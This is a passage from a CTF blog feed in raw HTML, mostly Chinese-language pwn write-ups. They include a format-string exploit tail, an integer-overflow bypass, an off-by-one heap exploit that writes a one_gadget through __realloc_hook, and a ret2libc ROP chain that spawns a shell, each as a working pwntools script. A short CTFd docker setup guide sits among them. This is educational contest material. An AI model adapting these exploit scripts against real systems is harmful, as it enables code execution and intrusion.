<span class="string">"d%22$hn"</span>)</span><br><span class="line"></span><br><span class="line">lis = HL(shell_addr)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + <span class="string">"c%57$hn"</span>)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">1</span>])  + <span class="string">"c%59$hn"</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>整数溢出，需要注意的是数值在比较的时候是用本身的数据，而做运算（如加减）的时候，用的是自身的补码。<br>此题输入的字符数中不让有”-“符号。</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>pass1绕过: x1和y1都是有符号整数，令x1为359，y1为0xffffffff就可以绕过判断</li><li>pass2绕过: 利用整数溢出里面的回绕，int类型大小为4个字节，最大存的数为0x00000000ffffffff,若两数相乘为0x0000000100000168    ，产出溢出结果等于0x168</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"x:"</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(<span class="number">359</span>))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"y:"</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(<span class="number">2</span>**<span class="number">32</span><span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"Please input x and y:"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.sendline(str(<span class="number">8</span>)+<span class="string">" "</span>+str(<span class="number">0x0000000100000168</span>/<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h2&gt;&lt;p&gt;格式化字符串漏洞，但跟平时做的还不太一样，这题输入的数据存到了bss段，&lt;br&gt;任意地址写的时候，不能像平时那样直接写到栈上
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019 RoarCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2019/10/14/2019-RoarCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2019/10/14/2019-RoarCTF-pwn-writeup/</id>
    <published>2019-10-14T12:40:35.000Z</published>
    <updated>2019-10-14T14:59:01.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>off-by-one漏洞,输入content的时候，可控size的大小;<br>第二次输入size - 第一次输入的size = 10 时，可多输入一字节。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p><img alt="" data-src="https://raw.githubusercontent.com/https://github.com/nocbtm/picgo/master/img/off_by_one.png" class="lozad"></p><ul><li>利用堆块重叠，修改B的size为B+C的size</li><li>free B , 再malloc B ，就可以泄露C里面的&lt; main_arena+88 &gt;，再减去距离libc_base的偏移，得到libc_base</li><li>再利用堆块重叠，修改E的size为E+F的size</li><li>free E , malloc E+F大小的size，修复F的size，再free F</li><li>把target_addr 写入到F的fd位</li><li>malloc F ,就可以malloc target_addr，达到任意地址写</li></ul><p>但是这题用的是calloc，不能把 &lt;__malloc_hook &gt;写onegadget;<br>应该把 &lt;_realloc_hook &gt;写入onegadget，再把&lt;_malloc_hook &gt;写入&lt; _realloc_hook &gt;。</p><ul><li>&lt;__malloc_hook&gt;在 &lt; main_arena-0x10&gt;</li><li>&lt;__realloc_hook&gt;在&lt; main_arena-0x18&gt;</li><li>&lt;__memalign_hook&gt;在&lt; main_arena-0x20&gt;</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./easy_pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote("39.97.182.233", 41458)</span></span><br><span class="line">elf = ELF(<span class="string">"./easy_pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>,str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x68</span>+<span class="number">10</span>,<span class="string">"a"</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+<span class="string">"\xe1"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">data = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(data)</span><br><span class="line">main_arean = data<span class="number">-88</span></span><br><span class="line">libc_base = main_arean - <span class="number">0x3c4b20</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">target_addr = data<span class="number">-0x8b</span></span><br><span class="line">one_gadgets=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x68</span>+<span class="number">10</span>,<span class="string">"a"</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+<span class="string">"\xe1"</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xd0</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xd0</span>,<span class="string">"\x02"</span>*<span class="number">0x68</span>+p64(<span class="number">0x70</span>)+<span class="string">"\x06"</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xd0</span>,<span class="string">"\x03"</span>*<span class="number">0x68</span>+p64(<span class="number">0x70</span>)+p64(target_addr)+<span class="number">0x58</span>*<span class="string">"\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x68</span>) <span class="comment"># 8</span></span><br><span class="line"><span class="keyword">print</span> hex(one_gadgets[<span class="number">2</span>]+libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base+libc.symbols[<span class="string">"realloc"</span>]+<span class="number">13</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0xb</span>+p64(one_gadgets[<span class="number">2</span>]+libc_base)+p64(libc_base+libc.symbols[<span class="string">"realloc"</span>]+<span class="number">13</span>)+<span class="string">"a"</span>*(<span class="number">0x50</span><span class="number">-3</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="calloc-magic"><a href="#calloc-magic" class="headerlink" title="calloc_magic"></a>calloc_magic</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easypwn&quot;&gt;&lt;a href=&quot;#easypwn&quot; class=&quot;headerlink&quot; title=&quot;easypwn&quot;&gt;&lt;/a&gt;easypwn&lt;/h2&gt;&lt;h3 id=&quot;程序分析&quot;&gt;&lt;a href=&quot;#程序分析&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CTFd 比赛平台的搭建</title>
    <link href="https://nocbtm.github.io/2019/10/14/CTFd-%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://nocbtm.github.io/2019/10/14/CTFd-比赛平台的搭建/</id>
    <published>2019-10-14T11:40:10.000Z</published>
    <updated>2019-10-14T12:26:11.863Z</updated>
    
    <content type="html"><![CDATA[<p>开源项目地址 <a href="https://github.com/CTFd/CTFd" target="_blank" rel="noopener">https://github.com/CTFd/CTFd</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>建议在docker里面搭建，环境不会冲突。<a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">docker安装教程</a></p><p>安装完docker之后，可用以下命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8000:8000 -it ctfd/ctfd</span><br></pre></td></tr></table></figure></p><p>但是安装的太慢，不用官方的镜像，这里建议用阿里云公开的容器镜像，只用如下两条命令即可。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0</span><br></pre></td></tr></table></figure></p><p>安装镜像之后起个容器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8000:8000 -it registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0</span><br></pre></td></tr></table></figure></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在物理机访问 0.0.0.0:8000 即可,第一次登陆设置管理员账号密码，下图是已经设置过的<br><img alt="" data-src="https://raw.githubusercontent.com/https://github.com/nocbtm/picgo/master/img/20191014200922.png" class="lozad"></p><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h3 id="重命名镜像"><a href="#重命名镜像" class="headerlink" title="重命名镜像"></a>重命名镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag ctfd:latest registry.cn-hangzhou.aliyuncs.com/capeic_sbw/ctfd:1.0</span><br></pre></td></tr></table></figure><h3 id="查看docker进程"><a href="#查看docker进程" class="headerlink" title="查看docker进程"></a>查看docker进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span> ps -a</span><br><span class="line">CONTAINER ID        IMAGE                                              COMMAND                  CREATED             STATUS                      PORTS                                  NAMES</span><br><span class="line">d9f5eefb8d62        pwn_deploy_chroot:latest                           <span class="string">"/service.sh"</span>            6 days ago          Exited (255) 5 days ago     0.0.0.0:10000-10003-&gt;10000-10003/tcp   pwn_deploy_chroot</span><br><span class="line">846ac8b76082        pwn_docker:16.04                                   <span class="string">"/start.sh"</span>              10 days ago         Exited (255) 9 days ago     0.0.0.0:9997-&gt;9999/tcp                 musing_leakey</span><br><span class="line">fd531742a5a3        ctfd:latest                                        <span class="string">"/opt/CTFd/docker-en…"</span>   11 days ago         Up 8 seconds                0.0.0.0:8000-&gt;8000/tcp                 affectionate_khayyam</span><br><span class="line">36aeab92fea7        registry.cn-hangzhou.aliyuncs.com/liujunjie/angr   <span class="string">"/bin/sh -c 'su - an…"</span>   12 days ago         Exited (255) 2 days ago                                            mystifying_ardinghelli</span><br><span class="line">833d79e2e12e        ctf                                                <span class="string">"/bin/sh -c 'exec /b…"</span>   4 months ago        Exited (130) 4 months ago                                          epic_sutherland</span><br><span class="line">a55693666b02        ctf                                                <span class="string">"/bin/sh -c 'exec /b…"</span>   4 months ago        Exited (143) 4 months ago</span><br></pre></td></tr></table></figure><h3 id="停止容器进程"><a href="#停止容器进程" class="headerlink" title="停止容器进程"></a>停止容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop fd53</span><br></pre></td></tr></table></figure><h3 id="启动容器进程"><a href="#启动容器进程" class="headerlink" title="启动容器进程"></a>启动容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start fd53</span><br></pre></td></tr></table></figure><h3 id="重启容器进程"><a href="#重启容器进程" class="headerlink" title="重启容器进程"></a>重启容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart fd53</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开源项目地址 &lt;a href=&quot;https://github.com/CTFd/CTFd&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/CTFd/CTFd&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安
      
    
    </summary>
    
      <category term="ctf" scheme="https://nocbtm.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://nocbtm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>OGeekCTF 2019 部分 writeups</title>
    <link href="https://nocbtm.github.io/2019/10/11/OGeekCTF-2019-%E9%83%A8%E5%88%86-writeups/"/>
    <id>https://nocbtm.github.io/2019/10/11/OGeekCTF-2019-部分-writeups/</id>
    <published>2019-10-11T08:19:38.000Z</published>
    <updated>2019-10-11T10:36:26.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>靶机环境是32位的glibc-2.23。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">check</span><span class="params">(<span class="keyword">int</span> random)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%ld"</span>, random);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Correct\n"</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序难点在于我们输入的buf要与随机生成的random前v1个字节要相等<br>我们可以直接输入\0开头的字符串来进行绕过，然后strlen的长度就为0，则后面的strncmp判断必定成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">vul</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后的漏洞函数中，a1是我们之前输入的第八个字符，如果我们输入\xff时；<br>则在read时a1会进行符号填充，那么我们就可以读入4294967295（-1）个字节，这将直接导致栈溢出，之后就行常规的ROP</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>脚本用了两种不同的ROP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">execve_file = <span class="string">'./babyrop'</span></span><br><span class="line"><span class="comment">#sh = process(execve_file)</span></span><br><span class="line">sh = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">sh.sendline(<span class="string">'\0'</span> + <span class="string">'\xff'</span> * <span class="number">10</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'a'</span>*<span class="number">231</span>+<span class="string">'b'</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(<span class="number">0x080487D0</span>)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'puts'</span>])+p32(<span class="number">4</span>))</span><br><span class="line">result=sh.recv(<span class="number">4</span>)</span><br><span class="line">libc.address = u32(result) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc.address))</span><br><span class="line">sh.send(<span class="string">'a'</span>*<span class="number">231</span>+<span class="string">'b'</span>*<span class="number">4</span>+p32(libc.symbols[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(libc.search(<span class="string">'/bin/sh'</span>).next()))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">sh.send('a' * 231 + p32(0x804b000 - 0x800) + p32(elf.plt['puts']) + p32(0x08048519) + p32(elf.got['puts']) + p32(elf.plt['read']) + p32(0x08048608) + p32(0) + p32(0x804b000 - 0x800) + p32(0x200))</span></span><br><span class="line"><span class="string">result = sh.recvuntil('\n')[:-1]</span></span><br><span class="line"><span class="string">libc_addr = u32(result) - libc.symbols['puts']</span></span><br><span class="line"><span class="string">log.success('libc_addr: ' + hex(libc_addr))</span></span><br><span class="line"><span class="string">sh.send(p32(0) + p32(libc_addr + libc.symbols['system']) + p32(libc_addr + libc.symbols['exit']) + p32(libc_addr + libc.search('/bin/sh').next()))</span></span><br><span class="line"><span class="string">sh.interactive()</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><h2 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>靶机环境是glibc-2.23,<br>在Add_text功能中，size的大小是由用户决定的，而在Update功能中，其输入的大小指定为255，导致堆溢出漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v6 = get_int();</span><br><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">256</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v2 = *(_QWORD *)(*(_QWORD *)(a1 + <span class="number">8</span> * (v4 + <span class="number">4L</span>L)) + <span class="number">8</span> * (i + <span class="number">4L</span>L));</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">32</span>) = <span class="built_in">malloc</span>(v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nText:"</span>);</span><br><span class="line">  read_n(&amp;s, <span class="number">0x100</span>u);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(*(_QWORD *)(*(_QWORD *)(a1 + <span class="number">8</span> * (v4 + <span class="number">4L</span>L)) + <span class="number">8</span> * (i + <span class="number">4L</span>L)) + <span class="number">32L</span>L), &amp;s, v3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nToo many"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\nNew Text:"</span>);</span><br><span class="line">read_n(*(<span class="keyword">void</span> **)(*(_QWORD *)(*(_QWORD *)(a1 + <span class="number">8</span> * (v5 + <span class="number">4L</span>L)) + <span class="number">8</span> * (v6 + <span class="number">4L</span>L)) + <span class="number">32L</span>L), <span class="number">255u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nUpdated"</span>, <span class="number">255L</span>L);</span><br><span class="line"><span 